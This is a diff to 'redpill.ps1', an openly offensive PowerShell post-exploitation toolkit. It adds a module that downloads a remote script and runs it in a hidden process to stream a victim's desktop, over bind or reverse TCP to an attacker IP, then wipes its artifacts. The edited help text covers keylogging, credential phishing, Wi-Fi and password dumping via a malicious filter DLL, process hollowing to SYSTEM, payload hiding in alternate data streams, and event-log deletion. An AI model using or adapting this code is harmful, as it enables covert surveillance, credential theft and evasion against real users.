@@ -80,7 +80,7 @@
    [string]$Exec="false", [string]$InTextFile="false", [int]$Delay='1',
    [string]$StreamData="false", [int]$Rate='1', [int]$TimeOut='5',
    [int]$BeaconTime='10', [int]$Interval='1', [int]$NewEst='3',
-   [int]$Volume='88', [int]$Screenshot='0', [int]$Timmer='10',
+   [int]$Volume='88', [int]$Screenshot='0', [int]$Timmer='15',
    [string]$FolderRigths="false", [string]$GroupName="false",
    [string]$Extension="false", [string]$FilePath="false",
    [string]$UserName="false", [string]$Password="false",
@@ -94,11 +94,13 @@
    [string]$Domain="www.facebook.com",
    [string]$ServiceName="WinDefend",
    [string]$CookieHijack="False",
+   [string]$LiveStream="false",
    [string]$HiddenUser="false",
    [string]$Execute="cmd.exe",
    [string]$DisableAV="false",
    [string]$EnableRDP="false",
    [string]$HideMyAss="false",
+   [string]$IpAddress="false",
    [string]$ToIPaddr="false",
    [string]$DnsSpoof="false",
    [string]$TimeOpen="false",
@@ -107,6 +109,7 @@
    [string]$Sponsor="false",
    [string]$UacMe="false",
    [string]$Verb="false",
+   [string]$Port="false",
    [string]$Id="false"
 )
 
@@ -170,6 +173,7 @@ $ListParameters = @"
   -StartWebServer   Python|Powershell        Downloads webserver to %TMP% and executes the WebServer.
   -Keylogger        Start|Stop               Start OR Stop recording remote host keystrokes
   -MouseLogger      Start                    Capture Screenshots of Mouse Clicks for 10 seconds
+  -LiveStream       Bind|Reverse|Stop        Nishang script to streaming a target desktop using MJPEG
   -PhishCreds       Start|Brute              Promp current user for a valid credential and leak captures
   -GetPasswords     Enum|Dump                Enumerate passwords of diferent locations {Store|Regedit|Disk}
   -WifiPasswords    Dump|ZipDump             Enum Available SSIDs OR ZipDump All Wifi passwords
@@ -1068,7 +1072,7 @@ If($Mouselogger -ieq "Start"){
 ## Random FileName generation
 $Rand = -join (((48..57)+(65..90)+(97..122)) * 80 |Get-Random -Count 6 |%{[char]$_})
 $CaptureFile = "$Env:TMP\SHot-" + "$Rand.zip" ## Capture File Name
-If($Timmer -lt '10' -or $Timmer -gt '300'){$Timmer = '10'}
+If($Timmer -lt '15' -or $Timmer -gt '300'){$Timmer = '15'}
 ## Set the max\min capture time value
 # Remark: The max capture time its 300 secs {5 minuts}
 
@@ -2760,6 +2764,316 @@ If($GetSkype -ne "False"){
 }
 
 
+If($LiveStream -ne "false"){
+
+   <#
+   .SYNOPSIS
+      Author: @samratashok (nishang) | @r00t-3xp10it
+      Helper - cmdlet for streaming a target's desktop using MJPEG.
+
+   .DESCRIPTION
+      This script uses MJPEG to stream a target's desktop in real time.
+      A browser which supports MJPEG (Firefox) should then be pointed
+      to the local port sellected by attacker to stream remote desktop.
+
+   .NOTES
+      Mandatory dependencies: A browser which supports MJPEG (Default: Firefox)
+      If attacker sellected -Timmer '0' then stream will stay open until attacker
+      manually stops it using this cmdlet -LiveStream 'Stop' argument, If another
+      Timmer its sellected then this cmdlet will wait -Timmer 'seconds' to stop
+      the streaming and delete ALL artifacts left behind by this function.
+
+   .PARAMETER LiveStream
+      Accepts arguments: Bind, Reverse, Stop (default: Bind)
+
+   .Parameter IPAddress
+      The IP address to connect to when using the -Reverse switch.
+
+   .PARAMETER Port
+      The port to connect to when using the -Reverse switch.
+      When using -Bind it is the port on which this script listens.
+
+   .PARAMETER Timmer
+      The amount of time in seconds to stream (default: 15)
+
+   .EXAMPLE
+      PS C:\> powershell -File redpill.ps1 -LiveStream Bind
+      Start target desktop live streammimg on port 1234 for 15 seconds!
+
+   .EXAMPLE
+      PS C:\> powershell -File redpill.ps1 -LiveStream Bind -Port 4321 -Timmer 20
+      Start target desktop live streammimg on port 4321 for 20 seconds!
+
+   .EXAMPLE
+      PS C:\> powershell -File redpill.ps1 -LiveStream Bind -Port 1234 -Timmer 0
+      Start target desktop live streammimg on port 1234 (but dont stop streaming)
+      Remark: If -Timmer '0' its sellected then manual stream stop its required!
+
+   .EXAMPLE
+      PS C:\> powershell -File redpill.ps1 -LiveStream Reverse -IpAddress 192.168.1.71 -Port 1234
+      Start target desktop live streammimg on port 1234 (port used by reverse tcp shell connection)
+      Remark: The follow netcat syntax can be used on attacker machine [ nc -nlvp 1234 | nc -nlvp 9000 ]
+      Remark: The follow powercat syntax can be used [ powercat -l -v -p 1234 -r tcp:9000 -rep -t 1000  ]
+
+   .EXAMPLE
+      PS C:\> powershell -File redpill.ps1 -LiveStream Stop
+      Stop target desktop live streammimg if sellected -Timmer '0' before!
+
+   .OUTPUTS
+      Stream desktop settings
+      -----------------------
+      Target   : 192.168.1.72
+      Stream   : Desktop
+      BindPort : 1234
+      Timmer   : 30 (sec)
+
+      Creating trigger.ps1 to import \ run module on a diferent process! (child)
+      Executing Start-Process to run module in a new powershell process! (child)
+      -----------------------------------------------------------------------------
+      Start firefox on attacker side on: http://192.168.1.72:1234 to access stream!
+      -----------------------------------------------------------------------------
+      Streaming remote target desktop for: 30 seconds!
+      Stoping process Id: 12334 (LiveStream)
+      Deleting ALL artifacts left behind!
+
+   .LINK
+      https://www.labofapenetrationtester.com/2015/12/stream-targets-desktop-using-mjpeg-and-powershell.html
+   #>
+
+
+   If($LiveStream -ieq "Bind")
+   {
+
+      ## Make sure requirements are sastified!
+      If($Port -ieq "false")
+      {
+         $Port = "1234" ## Default bind cmdlet port!
+         Write-Host "[error] none -port sellected, defaulting to '1234' tcp" -ForegroundColor DarkYellow  
+      }
+
+      ## Download Stream-TargetDesktop.ps1 from my GitHub
+      If(-not(Test-Path -Path "$Env:TMP\Stream-TargetDesktopps1")){## Download Stream-TargetDesktop.ps1 from my GitHub repository
+         Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/modules/Stream-TargetDesktop.ps1 -Destination $Env:TMP\Stream-TargetDesktop.ps1 -ErrorAction SilentlyContinue|Out-Null
+         ## Check downloaded file integrity => FileSizeKBytes
+         $SizeDump = ((Get-Item -Path "$Env:TMP\Stream-TargetDesktop.ps1" -EA SilentlyContinue).length/1KB)
+         If($SizeDump -lt 4){## Corrupted download detected => DefaultFileSize: 4,693359375/KB
+            Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
+            If(Test-Path -Path "$Env:TMP\Stream-TargetDesktop.ps1"){Remove-Item -Path "$Env:TMP\Stream-TargetDesktop.ps1" -Force}
+            Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
+         }   
+      }
+
+      ## Build OutPut Table
+      Write-Host "`nStream desktop settings" -ForegroundColor Green
+      Write-Host "-----------------------"
+      Write-Host "Target   : $Address"
+      Write-Host "Stream   : Bind"
+      Write-Host "BindPort : $Port"
+      If($Timmer -eq 0)
+      {
+         Write-Host "Timmer   : Manual stop sellected!`n`n"
+      }
+      Else
+      {
+         Write-Host "Timmer   : $Timmer (sec)`n`n"
+      }
+
+
+      Start-Sleep -Seconds 1
+      ## Create trigger script to import\run module on a diferent process! (child)
+      Write-Host "Creating trigger.ps1 to import \ run module on a diferent process! (child)"
+      echo "Import-Module -Name `"$Env:TMP\Stream-TargetDesktop.ps1`" -EA SilentlyContinue -Force"|Out-File -FilePath "$Env:TMP\trigger.ps1" -Encoding ascii -Force
+      Add-Content $Env:TMP\trigger.ps1 "TargetScreen -Bind -Port $Port"
+
+      ## Run remote module in a new powershell process
+      Write-Host "Executing Start-Process to run module in a new powershell process! (child)"
+      Start-Process -WindowStyle hidden powershell -ArgumentList "-File $Env:TMP\trigger.ps1"|Out-Null
+
+
+      ## Start firefox to access streaming!
+      Write-Host "-----------------------------------------------------------------------------"
+      Write-Host "Start firefox on attacker side on: http://127.0.0.1:${Port} to access stream!" -ForegroundColor Green
+      Write-Host "-----------------------------------------------------------------------------";Start-Sleep -Milliseconds 500
+      If($Timmer -eq 0)
+      {
+         Write-Host "Streaming remote target desktop for: Manual stop sellected!"
+      }
+      Else
+      {
+         Write-Host "Streaming remote target desktop for: $Timmer seconds!"      
+      }
+
+
+      If($Timmer -ne 0)
+      {
+         Start-Sleep -Seconds $Timmer ## Timmer to stop streamming!
+         $StreamPid = Get-Content -Path "$Env:TMP\mypid.log" -EA SilentlyContinue | Where-Object { $_ -ne '' }
+         Write-Host "Stoping process Id: $StreamPid (LiveStream)" -ForegroundColor DarkYellow
+         Stop-Process -id $StreamPid -EA SilentlyContinue -Force
+
+         ## Delete artifacts left behind
+         Write-Host "Deleting ALL artifacts left behind!"
+         If(Test-Path -Path "$Env:TMP\mypid.log" -ErrorAction SilentlyContinue){Remove-Item -Path "$Env:TMP\mypid.log" -Force}
+         If(Test-Path -Path "$Env:TMP\trigger.ps1" -ErrorAction SilentlyContinue){Remove-Item -Path "$Env:TMP\trigger.ps1" -Force}
+         If(Test-Path -Path "$Env:TMP\Stream-TargetDesktop.ps1" -ErrorAction SilentlyContinue){Remove-Item -Path "$Env:TMP\Stream-TargetDesktop.ps1" -Force}
+         Write-Host "`n";Start-Sleep -Seconds 1
+      }
+      Else
+      {
+         Write-Host "To stop stream execute: powershell -File redpill.ps1 -LiveStream Stop" -ForegroundColor DarkYellow
+         echo "Port: $Port"|Out-File -FilePath "$Env:TMP\myport.log" -Encoding ascii -Force
+         Write-Host "";Start-Sleep -Seconds 1
+      }
+
+   } ## End of Bind arg
+
+
+   If($LiveStream -ieq "Reverse")
+   {
+
+      ## Make sure requirements are sastified!
+      If($IpAddess -ieq "False")
+      {
+         Write-Host "[error] This function requires attacker -IpAddess 'ipaddress'!" -ForegroundColor Red -BackgroundColor Black
+         Write-Host "";Start-Sleep -Seconds 1
+         exit ## Exit @redpill
+      }
+      If($Port -ieq "False")
+      {
+         Write-Host "[error] This function requires reverse tcp shell -port number!" -ForegroundColor Red -BackgroundColor Black
+         Write-Host "";Start-Sleep -Seconds 1
+         exit ## Exit @redpill
+      }
+
+      ## Download Stream-TargetDesktop.ps1 from my GitHub
+      If(-not(Test-Path -Path "$Env:TMP\Stream-TargetDesktopps1")){## Download Stream-TargetDesktop.ps1 from my GitHub repository
+         Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/modules/Stream-TargetDesktop.ps1 -Destination $Env:TMP\Stream-TargetDesktop.ps1 -ErrorAction SilentlyContinue|Out-Null
+         ## Check downloaded file integrity => FileSizeKBytes
+         $SizeDump = ((Get-Item -Path "$Env:TMP\Stream-TargetDesktop.ps1" -EA SilentlyContinue).length/1KB)
+         If($SizeDump -lt 4){## Corrupted download detected => DefaultFileSize: 4,693359375/KB
+            Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
+            If(Test-Path -Path "$Env:TMP\Stream-TargetDesktop.ps1"){Remove-Item -Path "$Env:TMP\Stream-TargetDesktop.ps1" -Force}
+            Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
+         }   
+      }
+
+      ## Build OutPut Table
+      Write-Host "`nStream desktop settings" -ForegroundColor Green
+      Write-Host "--------------------------"
+      Write-Host "Target      : $Address"
+      Write-Host "Lhost       : $IPAddress"
+      Write-Host "Stream      : Reverse"
+      Write-Host "ReversePort : $Port"
+      If($Timmer -eq 0)
+      {
+         Write-Host "Timmer   : Manual stop sellected!`n`n"
+      }
+      Else
+      {
+         Write-Host "Timmer   : $Timmer (sec)`n`n"
+      }
+
+
+      Start-Sleep -Seconds 1
+      ## Create trigger script to import\run module on a diferent process! (child)
+      Write-Host "Creating trigger.ps1 to import \ run module on a diferent process! (child)"
+      echo "Import-Module -Name `"$Env:TMP\Stream-TargetDesktop.ps1`" -EA SilentlyContinue -Force"|Out-File -FilePath "$Env:TMP\trigger.ps1" -Encoding ascii -Force
+      Add-Content $Env:TMP\trigger.ps1 "TargetScreen -Reverse -IPAddress $IPAddress -Port $Port"
+
+      ## Run remote module in a new powershell process
+      Write-Host "Executing Start-Process to run module in a new powershell process! (child)"
+      Start-Process -WindowStyle hidden powershell -ArgumentList "-File $Env:TMP\trigger.ps1"|Out-Null
+
+
+      ## Start firefox to access streaming!
+      Write-Host "-----------------------------------------------------------------------------"
+      Write-Host "Start firefox on attacker side on: http://${IPAddress}:${Port} to access stream!" -ForegroundColor Green
+      Write-Host "-----------------------------------------------------------------------------";Start-Sleep -Milliseconds 500
+      If($Timmer -eq 0)
+      {
+         Write-Host "Streaming remote target desktop for: Manual stop sellected!"
+      }
+      Else
+      {
+         Write-Host "Streaming remote target desktop for: $Timmer seconds!"      
+      }
+
+
+      If($Timmer -ne 0)
+      {
+         Start-Sleep -Seconds $Timmer ## Timmer to stop streamming!
+         $StreamPid = Get-Content -Path "$Env:TMP\mypid.log" -EA SilentlyContinue | Where-Object { $_ -ne '' }
+         Write-Host "Stoping process Id: $StreamPid (LiveStream)" -ForegroundColor DarkYellow
+         Stop-Process -id $StreamPid -EA SilentlyContinue -Force
+
+         ## Delete artifacts left behind
+         Write-Host "Deleting ALL artifacts left behind!"
+         If(Test-Path -Path "$Env:TMP\mypid.log" -ErrorAction SilentlyContinue){Remove-Item -Path "$Env:TMP\mypid.log" -Force}
+         If(Test-Path -Path "$Env:TMP\trigger.ps1" -ErrorAction SilentlyContinue){Remove-Item -Path "$Env:TMP\trigger.ps1" -Force}
+         If(Test-Path -Path "$Env:TMP\Stream-TargetDesktop.ps1" -ErrorAction SilentlyContinue){Remove-Item -Path "$Env:TMP\Stream-TargetDesktop.ps1" -Force}
+         Write-Host "`n";Start-Sleep -Seconds 1
+      }
+      Else
+      {
+         Write-Host "To stop stream execute: powershell -File redpill.ps1 -LiveStream Stop" -ForegroundColor DarkYellow
+         echo "Port: $Port"|Out-File -FilePath "$Env:TMP\myport.log" -Encoding ascii -Force
+         Write-Host "";Start-Sleep -Seconds 1
+      }
+
+   } ## End of Reverse arg
+
+
+   If($LiveStream -ieq "Stop")
+   {
+   
+      <#
+      .SYNOPSIS
+         Helper - Stops stream on remote host and deletes artifacts!
+
+      .NOTES
+         The parameter -LiveStream 'Bind|Reverse' creates 'mypid.log'
+         on target %tmp% directory to store the port used and the child
+         process PID (stream) required to Stop remote streamming later!
+      #>
+
+
+      If(-not(Test-Path -Path "$Env:TMP\mypid.log" -EA SilentlyContinue))
+      {
+         Write-Host "[error] file not found: '$Env:TMP\mypid.log'.." -ForegroundColor Red -BackgroundColor Black
+         Write-Host "mypid.log contains the last stream process PID required by this module!" -ForegroundColor DarkYellow
+         Write-Host "";Start-Sleep -Seconds 1
+         exit ## Exit @redpill
+      }
+
+      $StreamPid = Get-Content -Path "$Env:TMP\mypid.log" -EA SilentlyContinue | Where-Object { $_ -ne '' }
+      $RawPort = Get-Content -Path "$Env:TMP\myport.log" -EA SilentlyContinue | Where-Object { $_ -iMatch '^(Port:)' }
+      $FinalPort = $RawPort -replace 'Port: ',''
+
+      ## Build OutPut Table
+      Write-Host "`nStream desktop settings" -ForegroundColor Green
+      Write-Host "-----------------------"
+      Write-Host "Target   : $Address"
+      Write-Host "Stream   : Stop"
+      Write-Host "BindPort : $FinalPort"
+      Write-Host "StreamId : $StreamPid (remote)`n`n"
+      Start-Sleep -Seconds 2
+
+      Write-Host "Stoping process Id: $StreamPid (LiveStream)" -ForegroundColor DarkYellow
+      Stop-Process -id $StreamPid -EA SilentlyContinue -Force
+
+      ## Delete ALL artifacts left behind!
+      Write-Host "Deleting ALL artifacts left behind!"
+      If(Test-Path -Path "$Env:TMP\mypid.log" -ErrorAction SilentlyContinue){Remove-Item -Path "$Env:TMP\mypid.log" -Force}
+      If(Test-Path -Path "$Env:TMP\myport.log" -ErrorAction SilentlyContinue){Remove-Item -Path "$Env:TMP\myport.log" -Force}
+      If(Test-Path -Path "$Env:TMP\trigger.ps1" -ErrorAction SilentlyContinue){Remove-Item -Path "$Env:TMP\trigger.ps1" -Force}
+      If(Test-Path -Path "$Env:TMP\Stream-TargetDesktop.ps1" -ErrorAction SilentlyContinue){Remove-Item -Path "$Env:TMP\Stream-TargetDesktop.ps1" -Force}
+      Write-Host "";Start-Sleep -Seconds 1
+   
+   } ## End of Stop arg
+
+}
+
+
 ## --------------------------------------------------------------
 ##       HELP =>  * PARAMETERS DETAILED DESCRIPTION *
 ## --------------------------------------------------------------
@@ -2828,7 +3142,7 @@ $HelpParameters = @"
       Helper - Enumerate remote host DNS cache entrys
 
    .Parameter GetDnsCache
-      Accepts arguments: Enum and Clear
+      Accepts arguments: Enum and Clear (default: Enum)
       
    .EXAMPLE
       PS C:\> powershell -File redpill.ps1 -GetDnsCache Enum
@@ -2855,14 +3169,14 @@ $HelpParameters = @"
    <#!Help.
    .SYNOPSIS
       Author: @r00t-3xp10it
-      Helper - Gets a list of ESTABLISHED connections (TCP)
+      Helper - Gets a list of ESTABLISHED TCP connections
    
    .DESCRIPTION
       Enumerates ESTABLISHED TCP connections and retrieves the
       ProcessName associated from the connection PID (Id) identifier
 
    .Parameter GetConnections
-      Accepts arguments: Enum and Verbose
+      Accepts arguments: Enum and Verbose (default: Enum)
     
    .EXAMPLE
       PS C:\> powershell -File redpill.ps1 -GetConnections Enum
@@ -2929,13 +3243,13 @@ $HelpParameters = @"
       then cmdlet 'kill' or 'enum' the sellected processName.
 
    .NOTES
-      -GetProcess Tokens @argument requires Admin privileges
+      -GetProcess 'Tokens' @argument requires Admin privileges
 
    .Parameter GetProcess
-      Accepts arguments: Enum, Kill and Tokens
+      Accepts arguments: Enum, Kill and Tokens (default: Enum)
 
    .Parameter ProcessName
-      Accepts the process name to be query or kill
+      Accepts the process name to be query or kill (default: WinDefend)
 
    .EXAMPLE
       PC C:\> powershell -File redpill.ps1 -GetProcess Enum
@@ -2986,10 +3300,10 @@ $HelpParameters = @"
       Remark: Tasks have the default duration of 9 hours.
 
    .Parameter GetTasks
-      Accepts arguments: Enum, Create and Delete
+      Accepts arguments: Enum, Create and Delete (default: Enum)
 
    .Parameter TaskName
-      Accepts the name of the task to be created
+      Accepts the name of the task to be created (defaut: mytask)
 
    .Parameter Interval
       Accepts the interval time (minuts) between each task execution
@@ -3048,7 +3362,7 @@ $HelpParameters = @"
       then this cmdlet will start scan pre-defined event paths and ID's numbers!
 
    .Parameter GetLogs
-      Accepts argument: Enum, Verbose, Yara, DeleteAll
+      Accepts argument: Enum, Verbose, Yara, DeleteAll (default: Enum)
 
    .Parameter NewEst
       How many event logs to display int value (default: 3)
@@ -3060,39 +3374,39 @@ $HelpParameters = @"
       Accepts 'ONE' Eventvwr path to be scanned\Deleted! 
 
    .EXAMPLE
-      PS C:\> .\redpill.ps1 -GetLogs Enum
+      PS C:\> powershell -File redpill.ps1 -GetLogs Enum
       Lists Major eventvwr categorie entrys
 
    .EXAMPLE
-      PS C:\> .\redpill.ps1 -GetLogs Verbose
+      PS C:\> powershell -File redpill.ps1 -GetLogs Verbose
       List newest 3 (default) Powershell\Application\System entrys!
 
    .EXAMPLE
-      PS C:\> .\redpill.ps1 -GetLogs Verbose -NewEst 8
+      PS C:\> powershell -File redpill.ps1 -GetLogs Verbose -NewEst 8
       List newest 8 Eventvwr Powershell\Application\System entrys!
 
    .EXAMPLE
-      PS C:\> .\redpill.ps1 -GetLogs Yara -NewEst 28
+      PS C:\> powershell -File redpill.ps1 -GetLogs Yara -NewEst 28
       List newest 28 logs using cmdlet default Id's and categories!
 
    .EXAMPLE
-      PS C:\> .\redpill.ps1 -GetLogs Yara -NewEst 13 -Id 59
+      PS C:\> powershell -File redpill.ps1 -GetLogs Yara -NewEst 13 -Id 59
       List newest 13 logfiles with Id: 59 using cmdlet default categories!
 
    .EXAMPLE
-      PS C:\> .\redpill.ps1 -GetLogs Yara -verb "system" -Id 1 -NewEst 10
+      PS C:\> powershell -File redpill.ps1 -GetLogs Yara -verb "system" -Id 1 -NewEst 10
       List newest 10 logfiles of 'system' categorie with id: 1
 
    .EXAMPLE
-      PS C:\> .\redpill.ps1 -GetLogs Yara -Verb "Microsoft-Windows-NetworkProfile/Operational" -id 10001
+      PS C:\> powershell -File redpill.ps1 -GetLogs Yara -Verb "Microsoft-Windows-NetworkProfile/Operational" -id 10001
       List newest 3 (default) logfiles of 'NetworkProfile/Operational' categorie with Id: 10001
 
    .EXAMPLE
-      PS C:\> .\redpill.ps1 -GetLogs DeleteAll
+      PS C:\> powershell -File redpill.ps1 -GetLogs DeleteAll
       Delete ALL eventvwr (categories) logs from snapIn!
 
    .EXAMPLE
-      PS C:\> .\redpill.ps1 -GetLogs DeleteAll -Verb "Microsoft-Windows-Powershell/Operational"
+      PS C:\> powershell -File redpill.ps1 -GetLogs DeleteAll -Verb "Microsoft-Windows-Powershell/Operational"
       Delete ONLY logfiles from "Microsoft-Windows-Powershell/Operational" eventvwr categorie!
 
    .OUTPUTS
@@ -3125,7 +3439,7 @@ $HelpParameters = @"
       And identify install browsers and run enum modules.
 
    .Parameter GetBrowsers
-      Accepts arguments: Enum, Verbose and Creds
+      Accepts arguments: Enum, Verbose and Creds (default: Enum)
 
    .EXAMPLE
       PS C:\> powershell -File redpill.ps1 -GetBrowsers Enum
@@ -3165,7 +3479,7 @@ $HelpParameters = @"
       Accepts how many screenshot to be taken (default: 1)
 
    .Parameter Delay
-      Accepts the delay time (sec) between each capture
+      Accepts the delay time (sec) between each capture (default: 1)
 
    .EXAMPLE
       PS C:\> powershell -File redpill.ps1 -Screenshot 1
@@ -3188,7 +3502,7 @@ $HelpParameters = @"
 
    <#!Help.
    .SYNOPSIS
-      Author: @tedburke|@r00t-3xp10it
+      Author: @tedburke | @r00t-3xp10it
       Helper - List computer webcam device names or capture snapshot
 
    .NOTES
@@ -3199,7 +3513,7 @@ $HelpParameters = @"
       our binary file and bypass AV amsi detection.
 
    .Parameter Camera
-      Accepts arguments: Enum and Snap
+      Accepts arguments: Enum and Snap (default: Enum)
 
    .EXAMPLE
       PS C:\> powershell -File redpill.ps1 -Camera Enum
@@ -3222,7 +3536,7 @@ $HelpParameters = @"
 
    <#!Help.
    .SYNOPSIS
-      Author: @MarkusScholtes|@r00t-3xp10it
+      Author: @MarkusScholtes | @r00t-3xp10it
       Helper - Start Local HTTP WebServer (Background)
 
    .NOTES
@@ -3298,7 +3612,7 @@ $HelpParameters = @"
       its deleted or is process {void.exe} its stoped.
 
    .NOTES
-      Required Dependencies: void.exe {auto-install}
+      Required Dependencies: void.exe {auto-download}
 
    .Parameter Keylogger
       Accepts arguments: Start and Stop
@@ -3363,7 +3677,7 @@ $HelpParameters = @"
 
    <#!Help.
    .SYNOPSIS
-      Author: @mubix|@r00t-3xp10it
+      Author: @mubix | @r00t-3xp10it
       Helper - Promp the current user for a valid credential.
 
    .DESCRIPTION
@@ -3377,14 +3691,14 @@ $HelpParameters = @"
       Remark: On Windows <= 10 lmhosts and lanmanserver are running by default.
 
    .Parameter PhishCreds
-      Accepts arguments: Start and Brute
+      Accepts arguments: Start and Brute (default: Start)
 
    .Parameter Limmit
-      Aborts phishing after -Limmit [fail attempts] reached.
+      Aborts phishing after -Limmit 'fail attempts' reached.
 
    .Parameter Dicionary
       Accepts the absoluct \ relative path of dicionary.txt
-      Remark: Optional parameter of -PhishCreds [ Brute ]
+      Remark: Optional parameter of -PhishCreds 'Brute'
 
    .EXAMPLE
       PS C:\> powershell -File redpill.ps1 -PhishCreds Start
@@ -3392,8 +3706,8 @@ $HelpParameters = @"
 
    .EXAMPLE
       PS C:\> powershell -File redpill.ps1 -PhishCreds Start -Limmit 30
-      Prompt the current user for a valid credential and
-      Abort phishing after -Limmit [number] fail attempts.
+      Prompt the current user for a valid credential and Abort phishing
+      after -Limmit 'number' of fail attempts its reached.
 
    .EXAMPLE
       PS C:\> powershell -File redpill.ps1 -PhishCreds Brute -Dicionary "`$Env:TMP\passwords.txt"
@@ -3414,7 +3728,7 @@ $HelpParameters = @"
 
    <#!Help.
    .SYNOPSIS
-      Author: @_RastaMouse|@r00t-3xp10it {Sherlock v1.3}
+      Author: @_RastaMouse | @r00t-3xp10it
       Helper - Find Missing Software Patchs For Privilege Escalation
 
    .NOTES
@@ -3424,7 +3738,7 @@ $HelpParameters = @"
       Sherlock.ps1 GitHub WIKI page: https://tinyurl.com/y4mxe29h
 
    .Parameter EOP
-      Accepts arguments: Enum and Verbose
+      Accepts arguments: Enum and Verbose (default: Enum)
 
    .EXAMPLE
       PS C:\> powershell -File redpill.ps1 -EOP Enum
@@ -3512,10 +3826,10 @@ $HelpParameters = @"
       Required Dependencies: netsh {native}
 
    .Parameter WifiPasswords
-      Accepts arguments: Dump and ZipDump
+      Accepts arguments: Dump and ZipDump (default: Dump)
 
    .Parameter Storage
-      The directory path where to store the zip dump archive
+      The directory path where to store the zip archive (default: %tmp%)
 
    .EXAMPLE
       PS C:\> powershell -File redpill.ps1 -WifiPasswords Dump
@@ -3592,7 +3906,7 @@ $HelpParameters = @"
    .NOTES
       Required Dependencies: Wscript ComObject {native}
       Remark: Double Quotes are Mandatory in -MsgBox value
-      Remark: -TimeOut 0 parameter maintains the msgbox open.
+      Remark: -TimeOut '0' argument maintains the msgbox open.
 
       MsgBox Button Types
       -------------------
@@ -3628,7 +3942,7 @@ $HelpParameters = @"
 
    <#!Help.
    .SYNOPSIS
-      Author: @securethelogs|@r00t-3xp10it
+      Author: @securethelogs | @r00t-3xp10it
       Helper - Brute force ZIP archives {7z.exe}
 
    .DESCRIPTION
@@ -3677,7 +3991,7 @@ $HelpParameters = @"
       scripts and Deletes All eventvwr logs {admin privs}
 
    .Parameter CleanTracks
-      Accepts arguments: Clear and Paranoid
+      Accepts arguments: Clear and Paranoid (default: Clear)
 
    .EXAMPLE
       PS C:\> powershell -File redpill.ps1 -CleanTracks Clear
@@ -3700,26 +4014,26 @@ $HelpParameters = @"
 
    <#!Help.
    .SYNOPSIS
-      Author: @mubix|@r00t-3xp10it
+      Author: @mubix {MITRE T1174} | @r00t-3xp10it
       Helper - Stealing passwords every time they change {MITRE T1174}
       Helper - Search for creds in diferent locations {store|regedit|disk}
 
    .DESCRIPTION
-      -GetPasswords [ Enum ] search creds in store\reg\disk diferent locations.
-      -GetPasswords [ Dump ] Explores a native OS notification of when the user
+      -GetPasswords 'Enum' search creds in store\reg\disk diferent locations.
+      -GetPasswords 'Dump' Explores a native OS notification of when the user
       account password gets changed which is responsible for validating it.
 
    .NOTES
-      -GetPasswords [ Dump ] requires Administrator privileges
+      -GetPasswords 'Dump' requires Administrator privileges to run!
       To stop this exploit its required the manual deletion of '0evilpwfilter.dll'
       from 'C:\Windows\System32' and the reset of 'HKLM:\..\Control\lsa' registry key by executing:
       REG ADD "HKLM\System\CurrentControlSet\Control\lsa" /v "notification packages" /t REG_MULTI_SZ /d scecli /f
 
    .Parameter GetPasswords
-      Accepts arguments: Enum and Dump
+      Accepts arguments: Enum and Dump (default: Enum)
 
    .Parameter StartDir
-      The directory path where to start search recursive for files
+      The directory where to start search recursive (default: %userprofile%)
 
    .EXAMPLE
       PS C:\> powershell -File redpill.ps1 -GetPasswords Enum
@@ -3785,17 +4099,17 @@ $HelpParameters = @"
    <#!Help.
    .SYNOPSIS
       Author: @r00t-3xp10it
-      Helper - Display file \ application description (metadata)
+      Helper - Display file\application description (metadata)
    
    .DESCRIPTION
-      Display file \ application description (metadata)
+      Display file\application description (metadata)
 
    .NOTES
-      -Extension [ exe ] parameter its used to recursive search starting in -MetaData
+      -Extension 'exe' parameter its used to recursive search starting in -MetaData
       directory for standalone executables (exe) and display is property descriptions.
 
    .Parameter MetaData
-      Accepts the absoluct \ relative path of file \ appl to scan
+      Accepts the absoluct\relative path of file\appl to scan
 
    .Parameter Extension
       Used to recursive search for file extensions and displays metadata
@@ -3934,19 +4248,19 @@ $HelpParameters = @"
       Remark: Supported Payload Extensions are: txt | bat | ps1 | exe
 
    .EXAMPLE
-      PS C:\> .\redpill.ps1 -ADS Enum -StreamData "payload.bat" -StartDir "`$Env:TMP"
+      PS C:\> powershell -File redpill.ps1 -ADS Enum -StreamData "payload.bat" -StartDir "`$Env:TMP"
       Search recursive for payload.bat ADS stream record existence starting on -StartDir [ dir ]
 
    .EXAMPLE
-      PS C:\> .\redpill.ps1 -ADS Create -StreamData "Payload.bat" -InTextFile "legit.txt"
+      PS C:\> powershell -File redpill.ps1 -ADS Create -StreamData "Payload.bat" -InTextFile "legit.txt"
       Hidde the data of Payload.bat script inside legit.txt ADS `$DATA record
 
    .EXAMPLE
-      PS C:\> .\redpill.ps1 -ADS Exec -StreamData "payload.bat" -InTextFile "legit.mp3"
+      PS C:\> powershell -File redpill.ps1 -ADS Exec -StreamData "payload.bat" -InTextFile "legit.mp3"
       Execute\Access the alternate data stream of the sellected -InTextFile [ file ]
 
    .EXAMPLE
-      PS C:\> .\redpill.ps1 -ADS Clear -StreamData "Payload.bat" -InTextFile "legit.txt"
+      PS C:\> powershell -File redpill.ps1 -ADS Clear -StreamData "Payload.bat" -InTextFile "legit.txt"
       Delete payload.bat ADS `$DATA stream from legit.txt text file records
 
    .OUTPUTS
@@ -3966,7 +4280,7 @@ $HelpParameters = @"
 
    <#!Help.
    .SYNOPSIS
-      Author: @FuzzySecurity|@r00t-3xp10it
+      Author: @FuzzySecurity | @r00t-3xp10it
       Helper - Process Hollowing with powershell
 
    .DESCRIPTION
@@ -3975,10 +4289,10 @@ $HelpParameters = @"
       OR spawns an cmd.exe elevated prompt { NT AUTHORITY/SYSTEM }
 
    .Parameter PEHollow
-      Accepts arguments: GetSystem OR the Payload.exe absoluct \ relative path
+      Accepts arguments: GetSystem OR the Payload.exe absoluct\relative path
 
    .Parameter Sponsor
-      Accepts impersonate ProcessName executable absoluct \ relative path
+      Accepts impersonate ProcessName executable absoluct\relative path
 
    .EXAMPLE
       PS C:\> powershell -File redpill.ps1 -PEHollow GetSystem
@@ -4050,35 +4364,35 @@ $HelpParameters = @"
       [XmlBypass] The TimeOut to maintain the application open! (default: 1 seconds)
 
    .EXAMPLE
